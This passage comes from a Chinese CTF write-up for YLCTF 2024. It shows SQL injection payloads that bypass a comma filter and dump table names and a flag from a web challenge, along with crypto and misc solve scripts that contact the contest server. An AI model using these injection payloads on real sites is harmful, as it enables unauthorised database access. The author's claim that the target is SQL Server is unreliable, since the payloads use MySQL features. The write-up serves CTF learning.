</span></span><span style=display:flex><span><span style=color:#75715e>// 输出 URL 编码后的字符串
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>($s);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p><img alt=pexpl loading=lazy src=/posts/ctf/ylctf2024/pexpl.png></p><h5 id=round-1-sinxx复现>[Round 1] sInXx(复现)</h5><p>这题在写的时候一直没找到注入点，跟着复现一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>juan79%27%09and%09<span style=color:#f92672>(</span>1<span style=color:#f92672>=</span>1<span style=color:#f92672>)</span>%23
</span></span></code></pre></div><p>这个是有回显的，看下面的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>juan79%27%09and%09<span style=color:#f92672>(</span>1<span style=color:#f92672>=</span>2<span style=color:#f92672>)</span>%23
</span></span></code></pre></div><p>这个就是无回显的</p><p>然后接着继续测试一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>juan79%27%09union%09select%091,2,3,4%23
</span></span></code></pre></div><p>测试发现<code>,</code>应该被过滤了，可以用别名进行查询</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>1<span style=color:#960050;background-color:#1e0010>&#39;</span>%09UNION%09SELECT%09*%09FROM%09<span style=color:#f92672>((</span>SELECT%091<span style=color:#f92672>)</span>A%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>B%09join<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>C%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>D%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>E<span style=color:#f92672>)</span><span style=color:#75715e>#</span>
</span></span></code></pre></div><p>继续测(不是MySQL的数据库，而是sql sever的数据库)</p><p><code>sys.schema_table_statistics_with_buffer</code> 是一个系统表，通常在 SQL Server 中存在，包含关于表的统计信息。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>1<span style=color:#960050;background-color:#1e0010>&#39;</span>%09UNION%09SELECT%09*%09FROM%09<span style=color:#f92672>((</span>SELECT%09GROUP_CONCAT<span style=color:#f92672>(</span>TABLE_NAME<span style=color:#f92672>)</span>FROM%09sys.schema_table_statistics_with_buffer%09WHERE%09TABLE_SCHEMA<span style=color:#f92672>=</span>DATABASE<span style=color:#f92672>())</span>A%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>B%09join<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>C%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>D%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>E<span style=color:#f92672>)</span><span style=color:#75715e>#</span>
</span></span></code></pre></div><p><img alt=sInXx loading=lazy src=/posts/ctf/ylctf2024/sInXx.png></p><p>继续往下测</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>search<span style=color:#f92672>=</span>1<span style=color:#960050;background-color:#1e0010>&#39;</span>%09UNION%09SELECT%09*%09FROM%09<span style=color:#f92672>((</span>SELECT%09<span style=color:#e6db74>`</span>2<span style=color:#e6db74>`</span>%09FROM%09<span style=color:#f92672>(</span>SELECT%09*%09FROM%09<span style=color:#f92672>((</span>SELECT%091<span style=color:#f92672>)</span>a%09JOIN%09<span style=color:#f92672>(</span>SELECT%092<span style=color:#f92672>)</span>b<span style=color:#f92672>)</span>%09UNION%09SELECT%09*%09FROM%09DataSyncFLAG<span style=color:#f92672>)</span>p%09limit%092%09offset%091<span style=color:#f92672>)</span>A%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>B%09join<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>C%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>D%09join%09<span style=color:#f92672>(</span>SELECT%091<span style=color:#f92672>)</span>E<span style=color:#f92672>)</span><span style=color:#75715e>#</span>
</span></span></code></pre></div><p>最后得到了flag这个数据库没怎么遇见过涨知识了,</p><p>还有一道java我最近刚开始学，先不复现了。</p><h3 id=round-2>Round 2</h3><h4 id=crypto-1>crypto</h4><h5 id=round-2-ezaes>[Round 2] ezAES</h5><p>key和iv需要进行填充，得到字符串只会输入靶场得到flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.Padding <span style=color:#f92672>import</span> unpad
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>adjust_bytes</span>(data, size):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> data[:size]<span style=color:#f92672>.</span>ljust(size, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Adjust key and IV to be exactly 16 bytes</span>
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> adjust_bytes(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;YLCTF-CRYPTO&#39;</span>, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>iv <span style=color:#f92672>=</span> adjust_bytes(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;YLCTF-IV&#39;</span>, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Key:&#34;</span>, key)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;IV:&#34;</span>, iv)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># The encrypted data</span>
</span></span><span style=display:flex><span>encrypted_data <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\xed\x1d</span><span style=color:#e6db74>]</span><span style=color:#ae81ff>\xe6</span><span style=color:#e6db74>p</span><span style=color:#ae81ff>\xb7\xfa\x90</span><span style=color:#e6db74>/Gu</span><span style=color:#ae81ff>\xf4\xe2\x96\x84\xef</span><span style=color:#e6db74>90</span><span style=color:#ae81ff>\x92</span><span style=color:#e6db74>e</span><span style=color:#ae81ff>\xb4\xf8</span><span style=color:#e6db74>]&#34;</span><span style=color:#ae81ff>\xfc</span><span style=color:#e6db74>6</span><span style=color:#ae81ff>\xf8\x8c</span><span style=color:#e6db74>S</span><span style=color:#ae81ff>\xe9</span><span style=color:#e6db74>b</span><span style=color:#ae81ff>\x19</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create the AES cipher object</span>
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Decrypt the data</span>
</span></span><span style=display:flex><span>decrypted_data <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>decrypt(encrypted_data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Remove padding</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    unpadded_data <span style=color:#f92672>=</span> unpad(decrypted_data, AES<span style=color:#f92672>.</span>block_size)
</span></span><span style=display:flex><span>    <span style=color:#75715e># Convert to string</span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> unpadded_data<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decrypted flag:&#34;</span>, flag)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decryption failed. Error:&#34;</span>, str(e))
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Raw decrypted data:&#34;</span>, decrypted_data)
</span></span></code></pre></div><h5 id=round-2-ancat三血>[Round 2] ancat(三血)</h5><p>通过反 Arnold 变换对图像进行解码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> cv2
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>arnold_decode</span>(image, shuffle_times, a, b):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    decode_image <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>zeros(shape<span style=color:#f92672>=</span>image<span style=color:#f92672>.</span>shape, dtype<span style=color:#f92672>=</span>np<span style=color:#f92672>.</span>uint8)
</span></span><span style=display:flex><span>    h, w <span style=color:#f92672>=</span> image<span style=color:#f92672>.</span>shape[<span style=color:#ae81ff>0</span>], image<span style=color:#f92672>.</span>shape[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    N <span style=color:#f92672>=</span> h  <span style=color:#75715e># Assuming square image, otherwise use min(h, w)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(shuffle_times):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(h):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> y <span style=color:#f92672>in</span> range(w):
</span></span><span style=display:flex><span>                new_x <span style=color:#f92672>=</span> ((a<span style=color:#f92672>*</span>b<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>*</span>x <span style=color:#f92672>+</span> (<span style=color:#f92672>-</span>b)<span style=color:#f92672>*</span>y) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>                new_y <span style=color:#f92672>=</span> (<span style=color:#f92672>-</span>a<span style=color:#f92672>*</span>x <span style=color:#f92672>+</span> y) <span style=color:#f92672>%</span> N
</span></span><span style=display:flex><span>                decode_image[new_x, new_y, :] <span style=color:#f92672>=</span> image[x, y, :]
</span></span><span style=display:flex><span>        image <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>copy(decode_image)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    cv2<span style=color:#f92672>.</span>imwrite(<span style=color:#e6db74>&#39;de_flag.png&#39;</span>, decode_image, [int(cv2<span style=color:#f92672>.</span>IMWRITE_PNG_COMPRESSION), <span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> decode_image
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Usage</span>
</span></span><span style=display:flex><span>img <span style=color:#f92672>=</span> cv2<span style=color:#f92672>.</span>imread(<span style=color:#e6db74>&#39;en_flag.png&#39;</span>)
</span></span><span style=display:flex><span>decoded_img <span style=color:#f92672>=</span> arnold_decode(img, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>9</span>)
</span></span></code></pre></div><h5 id=round-2-hhhhhash二血>[Round 2] hhhhhash(二血)</h5><p>通过 RSA 加密和解密的操作，生成一个由 <code>2</code> 和 <code>3</code> 相关的预映像。该预映像是由两个固定值 <code>2</code> 和 <code>3</code>，以及它们加密后异或的解密结果组成的字符串。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> inverse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的 RSA 参数</span>
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> <span style=color:#ae81ff>24187393262220937846390501443742832858626434119009614437585110078354058452015513549456536194956883531427150348615517313864237793745207153851247294085645697596388459039963846522372296585446089302800483043022329465803710493794211051569707438274254451965191340677881575500674368344178840546343108889174677894222885416258598492663798090390503785098514218961277236306118846673370386248291600553097856252637702622367340613301550171775336709322733018489345819827313673171715980174821509418454309036717777663660169340209676530313209371349708592854940984111594670893579387030559835418881208057159859916049414143236495356055079</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 c = pow(2, e, N) ^ pow(3, e, N)</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> pow(<span style=color:#ae81ff>2</span>, e, N) <span style=color:#f92672>^</span> pow(<span style=color:#ae81ff>3</span>, e, N)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 phi 和 d</span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> N <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>  <span style=color:#75715e># 注意：这个假设只在 N 是梅森素数时成立</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 x</span>
</span></span><span style=display:flex><span>x <span style=color:#f92672>=</span> pow(c, d, N)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将结果转换为字节并编码为十六进制</span>
</span></span><span style=display:flex><span>b0 <span style=color:#f92672>=</span> (<span style=color:#ae81ff>2</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>256</span>, <span style=color:#e6db74>&#39;big&#39;</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>b1 <span style=color:#f92672>=</span> (<span style=color:#ae81ff>3</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>256</span>, <span style=color:#e6db74>&#39;big&#39;</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>b2 <span style=color:#f92672>=</span> x<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>256</span>, <span style=color:#e6db74>&#39;big&#39;</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 组合最终的 preimage</span>
</span></span><span style=display:flex><span>preimage <span style=color:#f92672>=</span> b0 <span style=color:#f92672>+</span> b1 <span style=color:#f92672>+</span> b2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Calculated preimage:&#34;</span>)
</span></span><span style=display:flex><span>print(preimage)
</span></span></code></pre></div><h5 id=round-2-rand一血>[Round 2] rand(一血)</h5><p>参考<a href=https://zhuanlan.zhihu.com/p/659030157>ASIS2023 Crypto - 知乎 (zhihu.com)</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;challenge.yuanloo.com&#39;</span>, <span style=color:#ae81ff>46464</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>400</span>):  <span style=color:#75715e># 本地测试不知道要多少轮，直接拉到400得到flag会自己断的</span>
</span></span><span style=display:flex><span>    line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    line_decoded <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>    print(line_decoded)  <span style=color:#75715e># 打印解码后的内容</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    numbers <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;\d+&#39;</span>, line_decoded)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> numbers:
</span></span><span style=display:flex><span>        p_value <span style=color:#f92672>=</span> int(numbers[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>        g <span style=color:#f92672>=</span> p_value <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;p =&#34;</span>, p_value)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;g:&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(line<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(str(g)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;g =&#34;</span>, g)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;:&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(line<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> p_value <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>}</span><span style=color:#e6db74>,</span><span style=color:#e6db74>{</span>y<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Sending: </span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>}</span><span style=color:#e6db74>,</span><span style=color:#e6db74>{</span>y<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h4 id=misc-1>Misc</h4><h5 id=round-2-imgai三血>[Round 2] IMGAI(三血)</h5><p>和iscc 2024的re题有点相似，也是需要识别图片转得知文字，利用模型得到答案</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> torch
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> torch.nn <span style=color:#66d9ef>as</span> nn
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> torchvision <span style=color:#f92672>import</span> transforms
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MNISTCNN</span>(nn<span style=color:#f92672>.</span>Module):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        super(MNISTCNN, self)<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span>()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>conv1 <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>Conv2d(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>32</span>, kernel_size<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>, padding<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>conv2 <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>Conv2d(<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>64</span>, kernel_size<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>fc1 <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>Linear(<span style=color:#ae81ff>64</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>fc2 <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>Linear(<span style=color:#ae81ff>1024</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>pool <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>MaxPool2d(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>relu <span style=color:#f92672>=</span> nn<span style=color:#f92672>.</span>ReLU()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>forward</span>(self, x):
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>pool(self<span style=color:#f92672>.</span>relu(self<span style=color:#f92672>.</span>conv1(x)))
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>pool(self<span style=color:#f92672>.</span>relu(self<span style=color:#f92672>.</span>conv2(x)))
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> x<span style=color:#f92672>.</span>view(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>64</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>        x <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>relu(self<span style=color:#f92672>.</span>fc1(x))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> self<span style=color:#f92672>.</span>fc2(x)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>load_model</span>(model_path):
</span></span><span style=display:flex><span>    model <span style=color:#f92672>=</span> MNISTCNN()
</span></span><span style=display:flex><span>    model<span style=color:#f92672>.</span>load_state_dict(torch<span style=color:#f92672>.</span>load(model_path, map_location<span style=color:#f92672>=</span>torch<span style=color:#f92672>.</span>device(<span style=color:#e6db74>&#39;cpu&#39;</span>)))
</span></span><span style=display:flex><span>    model<span style=color:#f92672>.</span>eval()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> model
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>preprocess_image</span>(binary_data):
</span></span><span style=display:flex><span>    image_array <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array([int(pixel) <span style=color:#66d9ef>for</span> pixel <span style=color:#f92672>in</span> binary_data])<span style=color:#f92672>.</span>reshape(<span style=color:#ae81ff>480</span>, <span style=color:#ae81ff>640</span>)
</span></span><span style=display:flex><span>    image <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>fromarray(np<span style=color:#f92672>.</span>uint8(image_array <span style=color:#f92672>*</span> <span style=color:#ae81ff>255</span>), mode<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;L&#39;</span>)
</span></span><span style=display:flex><span>    transform <span style=color:#f92672>=</span> transforms<span style=color:#f92672>.</span>Compose([
</span></span><span style=display:flex><span>        transforms<span style=color:#f92672>.</span>Resize((<span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>28</span>)),
</span></span><span style=display:flex><span>        transforms<span style=color:#f92672>.</span>ToTensor(),
</span></span><span style=display:flex><span>        transforms<span style=color:#f92672>.</span>Normalize((<span style=color:#ae81ff>0.1307</span>,), (<span style=color:#ae81ff>0.3081</span>,))
</span></span><span style=display:flex><span>    ])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> transform(image)<span style=color:#f92672>.</span>unsqueeze(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>predict_digit</span>(model, image):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> torch<span style=color:#f92672>.</span>no_grad():
</span></span><span style=display:flex><span>        output <span style=color:#f92672>=</span> model(image)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> torch<span style=color:#f92672>.</span>max(output, <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>item()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenge.yuanloo.com&#34;</span>, <span style=color:#ae81ff>30991</span>)
</span></span><span style=display:flex><span>        model <span style=color:#f92672>=</span> load_model(<span style=color:#e6db74>&#39;model.pth&#39;</span>)
</span></span><span style=display:flex><span>        predictions <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>36</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;input num </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>encode(), timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>                binary_data <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;[01]+&#34;</span>, data<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> binary_data:
</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;No binary data found in round </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>. Exiting...&#34;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                image <span style=color:#f92672>=</span> preprocess_image(binary_data[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>                predicted <span style=color:#f92672>=</span> predict_digit(model, image)
</span></span><span style=display:flex><span>                predictions<span style=color:#f92672>.</span>append(predicted)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                p<span style=color:#f92672>.</span>sendline(str(predicted)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Round </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>: Predicted digit: </span><span style=color:#e6db74>{</span>predicted<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
